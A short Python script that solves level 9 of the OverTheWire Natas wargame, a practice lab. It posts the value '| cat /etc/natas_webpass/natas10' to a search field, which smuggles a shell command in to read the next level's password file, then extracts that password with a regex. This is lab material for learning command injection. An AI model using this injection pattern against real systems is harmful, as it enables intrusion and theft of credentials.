import requests
import re
import sys

url = "http://natas9.natas.labs.overthewire.org/"
auth = ("natas9", "secret")

print("[*]Connecting. . .")

data = {
    "needle": "| cat /etc/natas_webpass/natas10" # this line using pipe "|" for bypass the Developers stock command and write the command that open file where located the password to next level.
}

req_post = requests.post(url=url, data=data, auth=auth)

flag = re.search(r"([A-Za-z0-9]{32})", req_post.text, re.IGNORECASE)
if flag:
    print("[+]Command was injected in input field!")
    print(f"[+]Congratulations! Here your password: {flag.group(1)}")
else:
    sys.exit("[-]Error. Command wasn't injected.")